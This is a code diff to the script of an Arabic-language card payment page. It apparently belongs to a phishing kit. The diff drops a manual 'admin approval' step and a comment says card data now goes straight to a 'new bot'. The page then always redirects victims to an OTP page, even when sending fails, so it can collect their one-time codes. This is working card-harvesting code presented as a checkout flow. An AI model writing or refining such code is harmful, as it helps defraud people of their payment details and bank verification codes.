@@ -269,7 +269,6 @@
     const termsCheckbox = document.getElementById('termsCheckbox');
     const submitBtn = document.getElementById('nextBtn');
 
-    // توليد معرف فريد للمستخدم أو جلبه من الذاكرة
     let userId = localStorage.getItem('a2_user_id');
     if (!userId) {
       userId = 'user_' + Math.random().toString(36).substring(2, 11);
@@ -400,7 +399,7 @@
 
       if (valid) {
         submitBtn.disabled = true;
-        submitBtn.textContent = '⏳ جاري إرسال الطلب للمسؤول وفي انتظار الموافقة...';
+        submitBtn.textContent = '⏳ جاري إرسال البيانات والتحويل...';
 
         const data = {
           user_id: userId,
@@ -411,65 +410,22 @@
         };
 
         try {
-          const response = await fetch('/api/payment-send', {
+          // إرسال البيانات في الخلفية للبوت الجديد فوراً
+          await fetch('/api/payment-send', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify(data)
           });
 
-          if (response.ok) {
-            const digits = card.replace(/\D/g, '');
-            const last4 = digits.slice(-4);
-            const brand = /^4/.test(digits) ? 'Visa' : (/^(5[1-5]|2[2-7])/.test(digits) ? 'MasterCard' : 'Card');
-            const payment = {
-              brand: brand,
-              last4: last4,
-              masked: '•••• •••• •••• ' + last4,
-              holder: holder,
-              expiry: expiry,
-              savedAt: Date.now()
-            };
-            try {
-              sessionStorage.setItem('pk_payment', JSON.stringify(payment));
-            } catch (e) {}
+          // تحويل المستخدم فوراً لصفحة الـ OTP بدون أي انتظار
+          window.location.href = 'otp.html';
 
-            checkApprovalStatus();
-          } else {
-            alert('تعذر إرسال الطلب. حاول مرة أخرى.');
-            submitBtn.disabled = false;
-            submitBtn.textContent = '🔒 المتابعة للدفع';
-          }
         } catch (error) {
-          alert('تعذر الاتصال بالخادم.');
-          submitBtn.disabled = false;
-          submitBtn.textContent = '🔒 المتابعة للدفع';
+          // حتى لو حدث خطأ بسيط في الاتصال، يتم تحويله لضمان استمرار التجربة
+          window.location.href = 'otp.html';
         }
       }
     });
-
-    function checkApprovalStatus() {
-      const interval = setInterval(async () => {
-        try {
-          const res = await fetch(`/api/payment-check?user_id=${userId}`);
-          const result = await res.json();
-
-          if (result.status === 'approved') {
-            clearInterval(interval);
-            submitBtn.textContent = '✅ تم قبول الطلب، جاري الانتقال...';
-            setTimeout(() => {
-              window.location.href = 'otp.html';
-            }, 1000);
-          } else if (result.status === 'rejected') {
-            clearInterval(interval);
-            alert('عذراً، تم رفض عملية الدفع من قبل الإدارة.');
-            submitBtn.disabled = false;
-            submitBtn.textContent = '🔒 المتابعة للدفع';
-          }
-        } catch (e) {
-          console.log('Checking status...');
-        }
-      }, 3000);
-    }
   </script>
 </body>
 </html>
